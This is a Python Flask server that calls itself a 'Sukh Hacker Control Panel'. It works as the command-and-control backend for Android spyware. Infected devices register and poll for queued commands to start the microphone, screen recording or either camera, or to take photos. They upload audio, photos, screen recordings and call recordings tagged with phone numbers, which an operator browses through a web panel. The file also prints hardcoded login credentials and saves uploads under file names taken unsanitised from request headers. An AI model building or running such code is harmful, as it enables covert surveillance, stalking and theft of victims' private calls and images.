from flask import Flask, request, jsonify, send_from_directory, render_template, send_file
import threading
import time
import json
import os
from datetime import datetime
import uuid
import sqlite3

app = Flask(__name__)

# Store connected devices and their status
connected_devices = {}
commands_queue = {}
uploaded_files = []

# Create uploads directory if not exists
UPLOAD_FOLDER = 'uploads'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

# Create call recordings directory
CALL_RECORDINGS_DIR = 'call_recordings'
if not os.path.exists(CALL_RECORDINGS_DIR):
    os.makedirs(CALL_RECORDINGS_DIR)

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# Database initialization for call recordings
def init_call_recordings_db():
    conn = sqlite3.connect('call_recordings.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS call_recordings
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  phone_number TEXT,
                  call_type TEXT,
                  timestamp DATETIME,
                  file_path TEXT)''')
    conn.commit()
    conn.close()

# Initialize call recordings database
init_call_recordings_db()

@app.route('/')
def home():
    return render_template('index.html', 
                         current_time=datetime.now().strftime("%Y-%m-%d %H:%M:%S"), 
                         server_ip=get_server_ip())

@app.route('/login')
def login():
    return render_template('login.html')

def get_server_ip():
    try:
        return "sukh-hacker007.onrender.com"
    except:
        return "localhost:5000"

# ================== CALL RECORDING ROUTES ==================

@app.route('/call_recording', methods=['GET'])
def get_call_recordings():
    """Get all call recordings for web panel"""
    try:
        conn = sqlite3.connect('call_recordings.db')
        c = conn.cursor()
        c.execute("SELECT * FROM call_recordings ORDER BY timestamp DESC")
        recordings = c.fetchall()
        conn.close()
        
        return jsonify({
            'status': 'success',
            'recordings': recordings
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/call_recording/upload', methods=['POST'])
def upload_call_recording():
    """Upload call recording from Android app"""
    try:
        if 'recording' not in request.files:
            return jsonify({'status': 'error', 'message': 'No recording file'})
        
        recording_file = request.files['recording']
        phone_number = request.form.get('phone_number', 'Unknown')
        call_type = request.form.get('call_type', 'Normal Call')
        device_id = request.form.get('device_id', 'unknown')
        
        if recording_file.filename == '':
            return jsonify({'status': 'error', 'message': 'No file selected'})
        
        # Save recording file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{timestamp}_{phone_number}.wav"
        filepath = os.path.join(CALL_RECORDINGS_DIR, filename)
        recording_file.save(filepath)
        
        # Save to database
        conn = sqlite3.connect('call_recordings.db')
        c = conn.cursor()
        c.execute("INSERT INTO call_recordings (phone_number, call_type, timestamp, file_path) VALUES (?, ?, ?, ?)",
                 (phone_number, call_type, datetime.now(), filepath))
        conn.commit()
        conn.close()
        
        # Also add to uploaded_files for consistency
        file_info = {
            'filename': filename,
            'device_id': device_id,
            'upload_time': time.time(),
            'size': os.path.getsize(filepath),
            'type': 'call_recording',
            'phone_number': phone_number,
            'call_type': call_type
        }
        uploaded_files.append(file_info)
        
        print(f"✅ Call recording uploaded: {filename} from device {device_id}")
        
        return jsonify({'status': 'success', 'message': 'Recording uploaded'})
    except Exception as e:
        print(f"❌ Call recording upload error: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/call_recording/<int:recording_id>')
def download_recording(recording_id):
    """Download specific recording file"""
    try:
        conn = sqlite3.connect('call_recordings.db')
        c = conn.cursor()
        c.execute("SELECT * FROM call_recordings WHERE id = ?", (recording_id,))
        recording = c.fetchone()
        conn.close()
        
        if recording and recording[4]:  # file_path
            if os.path.exists(recording[4]):
                return send_file(recording[4], as_attachment=True)
        
        return jsonify({'status': 'error', 'message': 'Recording not found'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/call_recording/delete/<int:recording_id>', methods=['DELETE'])
def delete_recording(recording_id):
    """Delete specific recording"""
    try:
        conn = sqlite3.connect('call_recordings.db')
        c = conn.cursor()
        c.execute("SELECT * FROM call_recordings WHERE id = ?", (recording_id,))
        recording = c.fetchone()
        
        if recording:
            # Delete file
            if recording[4] and os.path.exists(recording[4]):  # file_path
                os.remove(recording[4])
            
            # Delete from database
            c.execute("DELETE FROM call_recordings WHERE id = ?", (recording_id,))
            conn.commit()
            conn.close()
            
            return jsonify({'status': 'success', 'message': 'Recording deleted'})
        else:
            conn.close()
            return jsonify({'status': 'error', 'message': 'Recording not found'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/call_recording/device/<device_id>', methods=['GET'])
def get_device_call_recordings(device_id):
    """Get call recordings for specific device"""
    try:
        # Get recordings from uploaded_files for this device
        device_recordings = [f for f in uploaded_files if f['device_id'] == device_id and f.get('type') == 'call_recording']
        sorted_recordings = sorted(device_recordings, key=lambda x: x['upload_time'], reverse=True)
        
        return jsonify({
            'status': 'success',
            'recordings': sorted_recordings
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

# ================== EXISTING ROUTES (SAME AS BEFORE) ==================

# Photo upload endpoint
@app.route('/upload_photo', methods=['POST'])
def upload_photo():
    try:
        print("📸 Photo upload request received")

        device_id = request.headers.get('X-Device-Id', 'unknown')
        filename = request.headers.get('X-File-Name', f'photo_{int(time.time())}.jpg')

        # Save photo file
        file_path = os.path.join(UPLOAD_FOLDER, filename)
        with open(file_path, 'wb') as f:
            f.write(request.data)

        file_size = os.path.getsize(file_path)

        # Store file info
        file_info = {
            'filename': filename,
            'device_id': device_id,
            'upload_time': time.time(),
            'size': file_size,
            'type': 'photo'
        }

        uploaded_files.append(file_info)

        print(f"✅ Photo uploaded: {filename} from device {device_id}, size: {file_size} bytes")

        return jsonify({
            'status': 'success',
            'message': 'Photo uploaded successfully',
            'filename': filename,
            'size': file_size
        })

    except Exception as e:
        print(f"❌ Photo upload error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Screen recording upload endpoint
@app.route('/upload_screen_recording', methods=['POST'])
def upload_screen_recording():
    try:
        print("📹 Screen recording upload request received")

        device_id = request.headers.get('X-Device-Id', 'unknown')
        filename = request.headers.get('X-File-Name', f'screen_{int(time.time())}.mp4')

        # Save screen recording file
        file_path = os.path.join(UPLOAD_FOLDER, filename)
        with open(file_path, 'wb') as f:
            f.write(request.data)

        file_size = os.path.getsize(file_path)

        # Store file info
        file_info = {
            'filename': filename,
            'device_id': device_id,
            'upload_time': time.time(),
            'size': file_size,
            'type': 'screen_recording'
        }

        uploaded_files.append(file_info)

        print(f"✅ Screen recording uploaded: {filename} from device {device_id}, size: {file_size} bytes")

        return jsonify({
            'status': 'success',
            'message': 'Screen recording uploaded successfully',
            'filename': filename,
            'size': file_size
        })

    except Exception as e:
        print(f"❌ Screen recording upload error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Camera control endpoint
@app.route('/camera', methods=['POST'])
def camera_control():
    try:
        data = request.json
        command = data.get('command')
        action = data.get('action')
        device_id = data.get('device_id')

        print(f"📷 Camera command received: {command}, action: {action}, device: {device_id}")

        if not command:
            return jsonify({'status': 'error', 'message': 'No camera command provided'})

        sent_count = 0
        
        if device_id:
            # Send to specific device
            if device_id in commands_queue:
                commands_queue[device_id].append(command)
                sent_count = 1
                print(f"✅ Camera command '{command}' sent to device '{device_id}'")
                
                # Update device status
                if command in ['front_camera', 'back_camera']:
                    connected_devices[device_id]['camera_active'] = True
                    connected_devices[device_id]['current_camera'] = command
                elif command == 'stop_camera':
                    connected_devices[device_id]['camera_active'] = False
                    connected_devices[device_id]['current_camera'] = None
                    
            else:
                print(f"❌ Device '{device_id}' not found")
                return jsonify({'status': 'error', 'message': 'Device not found'}), 404
        else:
            # Send to all connected devices
            for dev_id in commands_queue:
                commands_queue[dev_id].append(command)
                sent_count += 1
                
                # Update device status
                if command in ['front_camera', 'back_camera']:
                    connected_devices[dev_id]['camera_active'] = True
                    connected_devices[dev_id]['current_camera'] = command
                elif command == 'stop_camera':
                    connected_devices[dev_id]['camera_active'] = False
                    connected_devices[dev_id]['current_camera'] = None
                    
            print(f"✅ Camera command '{command}' sent to all {sent_count} devices")

        return jsonify({
            'status': 'success',
            'message': f'Camera command {command} sent to devices',
            'devices_count': sent_count,
            'command': command
        })

    except Exception as e:
        print(f"❌ Camera control error: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

# File upload endpoint
@app.route('/data', methods=['POST'])
def upload_file():
    try:
        print("📁 File upload request received")

        if 'audio_file' not in request.files:
            return jsonify({'status': 'error', 'message': 'No file provided'}), 400

        file = request.files['audio_file']
        device_id = request.form.get('device_id', 'unknown')

        if file.filename == '':
            return jsonify({'status': 'error', 'message': 'No file selected'}), 400

        # Generate unique filename
        file_extension = file.filename.split('.')[-1] if '.' in file.filename else '3gp'
        unique_filename = f"{device_id}_{int(time.time())}.{file_extension}"
        file_path = os.path.join(UPLOAD_FOLDER, unique_filename)

        # Save file
        file.save(file_path)

        # Get file size
        file_size = os.path.getsize(file_path)

        # Store file info
        file_info = {
            'filename': unique_filename,
            'device_id': device_id,
            'upload_time': time.time(),
            'size': file_size,
            'original_name': file.filename,
            'type': 'audio'
        }

        uploaded_files.append(file_info)

        print(f"✅ File uploaded: {unique_filename} from device {device_id}, size: {file_size} bytes")

        return jsonify({
            'status': 'success',
            'message': 'File uploaded successfully',
            'filename': unique_filename,
            'size': file_size
        })

    except Exception as e:
        print(f"❌ File upload error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Serve uploaded files
@app.route('/file/<filename>')
def serve_file(filename):
    try:
        file_path = os.path.join(UPLOAD_FOLDER, filename)
        if not os.path.exists(file_path):
            print(f"❌ File not found: {filename}")
            return "File not found", 404

        # Determine content type based on file extension
        if filename.lower().endswith(('.jpg', '.jpeg', '.png', '.gif')):
            mimetype = 'image/jpeg'
        elif filename.lower().endswith(('.mp4', '.avi', '.mov', '.mkv')):
            mimetype = 'video/mp4'
        else:
            mimetype = 'audio/3gpp'

        return send_from_directory(UPLOAD_FOLDER, filename, 
                                 as_attachment=False,
                                 mimetype=mimetype)
    except Exception as e:
        print(f"❌ File serve error: {e}")
        return str(e), 500

# Get uploaded files list
@app.route('/get_files', methods=['GET'])
def get_files():
    try:
        # Sort files by upload time (newest first)
        sorted_files = sorted(uploaded_files, key=lambda x: x['upload_time'], reverse=True)

        # Check if files actually exist on disk
        valid_files = []
        for file_info in sorted_files:
            file_path = os.path.join(UPLOAD_FOLDER, file_info['filename'])
            if os.path.exists(file_path):
                valid_files.append(file_info)

        return jsonify({'files': valid_files})
    except Exception as e:
        print(f"❌ Get files error: {e}")
        return jsonify({'files': []})

# Get device-specific files
@app.route('/get_device_files/<device_id>', methods=['GET'])
def get_device_files(device_id):
    try:
        device_files = [f for f in uploaded_files if f['device_id'] == device_id]
        sorted_files = sorted(device_files, key=lambda x: x['upload_time'], reverse=True)
        
        # Check if files exist on disk
        valid_files = []
        for file_info in sorted_files:
            file_path = os.path.join(UPLOAD_FOLDER, file_info['filename'])
            if os.path.exists(file_path):
                valid_files.append(file_info)
                
        return jsonify({'files': valid_files})
    except Exception as e:
        print(f"❌ Get device files error: {e}")
        return jsonify({'files': []})

# Get specific device details
@app.route('/get_device/<device_id>', methods=['GET'])
def get_device_details(device_id):
    try:
        if device_id in connected_devices:
            device_data = connected_devices[device_id].copy()
            
            # Get device-specific files
            device_files = [f for f in uploaded_files if f['device_id'] == device_id]
            device_photos = [f for f in device_files if f.get('type') == 'photo']
            device_audios = [f for f in device_files if f.get('type') == 'audio']
            device_screen_recordings = [f for f in device_files if f.get('type') == 'screen_recording']
            device_call_recordings = [f for f in device_files if f.get('type') == 'call_recording']
            
            return jsonify({
                'status': 'success',
                'device': device_data,
                'files_count': len(device_files),
                'photos_count': len(device_photos),
                'audios_count': len(device_audios),
                'screen_recordings_count': len(device_screen_recordings),
                'call_recordings_count': len(device_call_recordings)
            })
        return jsonify({'status': 'error', 'message': 'Device not found'}), 404
    except Exception as e:
        print(f"❌ Get device details error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Delete file endpoint
@app.route('/delete_file/<filename>', methods=['DELETE'])
def delete_file(filename):
    try:
        file_path = os.path.join(UPLOAD_FOLDER, filename)
        if os.path.exists(file_path):
            os.remove(file_path)
            # Remove from uploaded_files list
            global uploaded_files
            uploaded_files = [f for f in uploaded_files if f['filename'] != filename]
            print(f"✅ File deleted: {filename}")
            return jsonify({'status': 'success', 'message': 'File deleted'})
        else:
            return jsonify({'status': 'error', 'message': 'File not found'}), 404
    except Exception as e:
        print(f"❌ Delete file error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Device registration endpoint
@app.route('/register_device', methods=['POST'])
def register_device():
    try:
        device_id = request.json.get('device_id')
        print(f"📱 Device registration attempt: {device_id}")

        if device_id:
            connected_devices[device_id] = {
                'status': 'connected',
                'last_seen': time.time(),
                'recording': False,
                'screen_recording': False,
                'camera_active': False,
                'current_camera': None
            }
            commands_queue[device_id] = []
            print(f"✅ Device registered: {device_id}")
            return jsonify({'status': 'registered', 'device_id': device_id})

        return jsonify({'status': 'error', 'message': 'No device ID'})

    except Exception as e:
        print(f"❌ Registration error: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

# Device checks for commands
@app.route('/get_commands/<device_id>', methods=['GET'])
def get_commands(device_id):
    try:
        if device_id in commands_queue:
            # Update last seen
            if device_id in connected_devices:
                connected_devices[device_id]['last_seen'] = time.time()

            # Return pending commands
            commands = commands_queue[device_id].copy()
            commands_queue[device_id] = []  # Clear commands after sending

            if commands:
                print(f"📤 Sending {len(commands)} commands to {device_id}: {commands}")
            return jsonify({'commands': commands})

        print(f"❌ Device {device_id} not found")
        return jsonify({'commands': []})

    except Exception as e:
        print(f"❌ Get commands error: {e}")
        return jsonify({'commands': []})

# Send command to all devices
@app.route('/send_command', methods=['POST'])
def send_command():
    try:
        command = request.json.get('command')
        device_id = request.json.get('device_id')

        print(f"📨 Received command '{command}' for device '{device_id}'")

        if not command:
            return jsonify({'status': 'error', 'message': 'No command provided'})

        sent_count = 0
        if device_id:
            # Send to specific device
            if device_id in commands_queue:
                commands_queue[device_id].append(command)
                sent_count = 1
                print(f"✅ Command '{command}' sent to device '{device_id}'")
                
                # Update device status
                update_device_status(device_id, command)
                    
            else:
                print(f"❌ Device '{device_id}' not found")
        else:
            # Send to all connected devices
            for dev_id in commands_queue:
                commands_queue[dev_id].append(command)
                sent_count += 1
                
                # Update device status
                update_device_status(dev_id, command)
                    
            print(f"✅ Command '{command}' sent to all {sent_count} devices")

        return jsonify({
            'status': 'command_sent', 
            'command': command,
            'devices_count': sent_count
        })

    except Exception as e:
        print(f"❌ Send command error: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

# Send command to specific device only
@app.route('/send_command_to_device', methods=['POST'])
def send_command_to_device():
    try:
        command = request.json.get('command')
        device_id = request.json.get('device_id')

        print(f"📨 Received command '{command}' for specific device '{device_id}'")

        if not command or not device_id:
            return jsonify({'status': 'error', 'message': 'No command or device ID provided'})

        if device_id in commands_queue:
            commands_queue[device_id].append(command)
            print(f"✅ Command '{command}' sent to device '{device_id}'")
            
            # Update device status
            update_device_status(device_id, command)
            
            return jsonify({
                'status': 'command_sent', 
                'command': command,
                'device_id': device_id,
                'message': f'Command sent to {device_id}'
            })
        else:
            print(f"❌ Device '{device_id}' not found")
            return jsonify({'status': 'error', 'message': 'Device not found'}), 404

    except Exception as e:
        print(f"❌ Send command error: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

# Helper function to update device status
def update_device_status(device_id, command):
    """Update device status based on command"""
    if device_id not in connected_devices:
        return
        
    if command == 'start_recording':
        connected_devices[device_id]['recording'] = True
    elif command == 'stop_recording':
        connected_devices[device_id]['recording'] = False
    elif command == 'start_screen_recording':
        connected_devices[device_id]['screen_recording'] = True
    elif command == 'stop_screen_recording':
        connected_devices[device_id]['screen_recording'] = False
    elif command in ['front_camera', 'back_camera']:
        connected_devices[device_id]['camera_active'] = True
        connected_devices[device_id]['current_camera'] = command
    elif command == 'stop_camera':
        connected_devices[device_id]['camera_active'] = False
        connected_devices[device_id]['current_camera'] = None
    elif command == 'capture_photo':
        # For photo capture, we don't change camera status
        pass

# Update device status endpoint
@app.route('/update_status', methods=['POST'])
def update_status():
    try:
        device_id = request.json.get('device_id')
        status = request.json.get('status')
        recording = request.json.get('recording', False)
        screen_recording = request.json.get('screen_recording', False)
        camera_active = request.json.get('camera_active', False)
        current_camera = request.json.get('current_camera')

        print(f"📊 Device {device_id} status update: {status}, recording: {recording}, screen_recording: {screen_recording}, camera: {camera_active}")

        if device_id in connected_devices:
            connected_devices[device_id]['status'] = status
            connected_devices[device_id]['recording'] = recording
            connected_devices[device_id]['screen_recording'] = screen_recording
            connected_devices[device_id]['camera_active'] = camera_active
            connected_devices[device_id]['current_camera'] = current_camera
            connected_devices[device_id]['last_seen'] = time.time()

        return jsonify({'status': 'updated'})

    except Exception as e:
        print(f"❌ Update status error: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

# Get connected devices
@app.route('/get_devices', methods=['GET'])
def get_devices():
    try:
        # Clean up old devices (more than 60 seconds)
        current_time = time.time()
        expired_devices = []
        for dev_id, device_data in connected_devices.items():
            if current_time - device_data['last_seen'] > 60:
                expired_devices.append(dev_id)

        for dev_id in expired_devices:
            del connected_devices[dev_id]
            if dev_id in commands_queue:
                del commands_queue[dev_id]
            print(f"🗑️ Removed expired device: {dev_id}")

        print(f"📋 Current devices: {len(connected_devices)}")
        return jsonify({'devices': connected_devices})

    except Exception as e:
        print(f"❌ Get devices error: {e}")
        return jsonify({'devices': {}})

# Test endpoint to check if server is running
@app.route('/test', methods=['GET'])
def test():
    return jsonify({
        'status': 'success',
        'message': 'Server is running!',
        'timestamp': time.time(),
        'connected_devices': len(connected_devices),
        'uploaded_files': len(uploaded_files)
    })

# Get server stats
@app.route('/stats', methods=['GET'])
def get_stats():
    return jsonify({
        'status': 'success',
        'connected_devices': len(connected_devices),
        'uploaded_files': len(uploaded_files),
        'commands_pending': sum(len(q) for q in commands_queue.values()),
        'server_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    print(f'🚀 Starting Sukh Hacker Control Panel...')
    print(f'📡 Web Panel: https://sukh-hacker007.onrender.com')
    print(f'🔐 Login URL: https://sukh-hacker007.onrender.com/login')
    print('🔑 Login Credentials:')
    print('   - Username: Sukh')
    print('   - Password: Sukh')
    print('📍 Available Endpoints:')
    print('   - GET  /')
    print('   - GET  /login')
    print('   - GET  /test')
    print('   - GET  /stats')
    print('   - POST /camera (camera control)')
    print('   - POST /data (audio upload)')
    print('   - POST /upload_photo (photo upload)')
    print('   - POST /upload_screen_recording (screen recording upload)')
    print('   - POST /call_recording/upload (call recording upload)')
    print('   - GET  /call_recording (get all call recordings)')
    print('   - GET  /call_recording/device/<device_id> (get device call recordings)')
    print('   - GET  /file/<filename>')
    print('   - GET  /get_files')
    print('   - GET  /get_device_files/<device_id>')
    print('   - GET  /get_device/<device_id>')
    print('   - DELETE /delete_file/<filename>')
    print('   - DELETE /call_recording/delete/<recording_id>')
    print('   - POST /register_device')
    print('   - GET  /get_commands/<device_id>')
    print('   - POST /send_command')
    print('   - POST /send_command_to_device')
    print('   - POST /update_status')
    print('   - GET  /get_devices')
    print('⏹️  Press Ctrl+C to stop')
    app.run(host='0.0.0.0', port=port, debug=False)